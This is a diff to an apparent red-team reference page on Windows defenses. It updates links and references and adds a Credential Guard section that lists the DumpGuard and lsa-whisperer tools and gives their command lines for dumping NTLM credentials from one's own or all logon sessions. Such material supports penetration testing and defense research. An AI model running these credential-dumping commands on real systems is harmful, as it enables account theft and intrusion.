@@ -76,7 +76,7 @@ UAC stands for User Account Control. It is a security feature introduced by Micr
 
 ## DPAPI
 
-Refer to [PayloadsAllTheThings/Windows - DPAPI.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20DPAPI.md)
+Refer to [InternalAllTheThings/Windows - DPAPI.md](https://swisskyrepo.github.io/InternalAllTheThings/redteam/evasion/windows-dpapi/)
 
 ## Powershell
 
@@ -314,6 +314,37 @@ PPL works by restricting access to the protected process's memory and system res
 When Credential Guard is enabled, it uses hardware-based virtualization to create a secure environment that is separate from the operating system. This secure environment is used to store sensitive credential information, which is encrypted and protected from unauthorized access.
 
 Credential Guard uses a combination of hardware-based virtualization and the Trusted Platform Module (TPM) to ensure that the secure kernel is trusted and secure. It can be enabled on devices that have a compatible processor and TPM version, and require a UEFI firmware that supports the necessary features.
+
+* [bytewreck/DumpGuard](https://github.com/bytewreck/DumpGuard) - Proof-of-Concept tool for extracting NTLMv1 hashes from sessions on modern Windows systems.
+* [EvanMcBroom/lsa-whisperer](https://github.com/EvanMcBroom/lsa-whisperer) - Tools for interacting with authentication packages using their individual message protocols.
+
+| Technique | Requires<br>SYSTEM | Requires<br>SPN Account | Can Dump<br>Credential Guard |
+| -------- | :-------: | :-------: | :-------: |
+| Extract own credentials via Remote Credential Guard protocol | :x:| ✅ | ✅ |
+| Extract all credentials via Remote Credential Guard protocol | ✅ | ✅ | ✅ |
+| Extract all credentials via Microsoft v1 authentication package | ✅ | :x: | :x: |
+
+* **Dumping own session using Remote Credential Guard**: this works regardless of the state of Credential Guard, but requires credentials for an SPN-enabled account.
+
+    ```ps1
+    DumpGuard.exe /mode:self /domain:<DOMAIN> /username:<SAMACCOUNTNAME> /password:<PASSWORD> [/spn:<SPN>]
+    ```
+
+* **Dumping all sessions using Remote Credential Guard**: this works regardless of the state of Credential Guard, but requires credentials for an SPN-enabled account and `SYSTEM` privileges.
+
+    ```ps1
+    DumpGuard.exe /mode:all /domain:<DOMAIN> /username:<SAMACCOUNTNAME> /password:<PASSWORD> [/spn:<SPN>]
+    ```
+
+* **Dumping all sessions using Microsoft v1 authentication package**
+    * Credential Guard is disabled on the local system.
+    * Remote users are authenticated to the local system from a remote host over Remote Credential Guard.
+
+    ```ps1
+    DumpGuard.exe /mode:all
+    # or
+    lsa-whisperer.exe msv1_0 Lm20GetChallengeResponse --luid {session id} --challenge {challenge to clients} [flags...]
+    ```
 
 ## Event Tracing for Windows
 
@@ -558,13 +589,14 @@ You can check if it is done decrypting using this command: `manage-bde -status`
 
 ## References
 
-* [SNEAKING PAST DEVICE GUARD - Cybereason - Philip Tsukerman](https://troopers.de/downloads/troopers19/TROOPERS19_AR_Sneaking_Past_Device_Guard.pdf)
-* [PowerShell about_Logging_Windows - Microsoft Documentation](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.3)
-* [Do You Really Know About LSA Protection (RunAsPPL)? - itm4n - Apr 7, 2021](https://itm4n.github.io/lsass-runasppl/)
-* [Determine the Enterprise Context of an app running in Windows Information Protection (WIP) - 03/10/2023 - Microsoft](https://learn.microsoft.com/en-us/windows/security/information-protection/windows-information-protection/wip-app-enterprise-context)
-* [Create and verify an Encrypting File System (EFS) Data Recovery Agent (DRA) certificate - 12/09/2022 - Microsoft](https://learn.microsoft.com/en-us/windows/security/information-protection/windows-information-protection/create-and-verify-an-efs-dra-certificate)
-* [DISABLING AV WITH PROCESS SUSPENSION - March 24, 2023 - By Christopher Paschen](https://www.trustedsec.com/blog/disabling-av-with-process-suspension/)
-* [Disabling Event Tracing For Windows - UNPROTECT PROJECT - Tuesday 19 April 2022](https://unprotect.it/technique/disabling-event-tracing-for-windows-etw/)
-* [ETW: Event Tracing for Windows 101 - ired.team](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/etw-event-tracing-for-windows-101)
-* [Remove Windows Defender Application Control (WDAC) policies - Microsoft - 12/09/2022](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/disable-windows-defender-application-control-policies)
-* [Attack surface reduction rules reference - Microsoft 365 - 11/30/2023](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide)
+* [Attack surface reduction rules reference - Microsoft 365 - November 30, 2023](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide)
+* [Catching Credential Guard Off Guard - Valdemar Carøe - October 23, 2025](https://specterops.io/blog/2025/10/23/catching-credential-guard-off-guard/)
+* [Create and verify an Encrypting File System (EFS) Data Recovery Agent (DRA) certificate - Microsoft - December 9, 2022](https://learn.microsoft.com/en-us/windows/security/information-protection/windows-information-protection/create-and-verify-an-efs-dra-certificate)
+* [Determine the Enterprise Context of an app running in Windows Information Protection (WIP) - Microsoft - March 10, 2023](https://learn.microsoft.com/en-us/windows/security/information-protection/windows-information-protection/wip-app-enterprise-context)
+* [DISABLING AV WITH PROCESS SUSPENSION - Christopher Paschen - March 24, 2023](https://www.trustedsec.com/blog/disabling-av-with-process-suspension/)
+* [Disabling Event Tracing For Windows - UNPROTECT Project - April 19, 2022](https://unprotect.it/technique/disabling-event-tracing-for-windows-etw/)
+* [Do You Really Know About LSA Protection (RunAsPPL)? - itm4n - April 7, 2021](https://itm4n.github.io/lsass-runasppl/)
+* [ETW: Event Tracing for Windows 101 - ired.team - January 6, 2020](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/etw-event-tracing-for-windows-101)
+* [PowerShell about_Logging_Windows - Microsoft Documentation - September 30, 2025](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.3)
+* [Remove Windows Defender Application Control (WDAC) policies - Microsoft - December 9, 2022](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/disable-windows-defender-application-control-policies)
+* [Sneaking Past Device Guard - Cybereason - Philip Tsukerman - December 4, 2022](https://troopers.de/downloads/troopers19/TROOPERS19_AR_Sneaking_Past_Device_Guard.pdf)
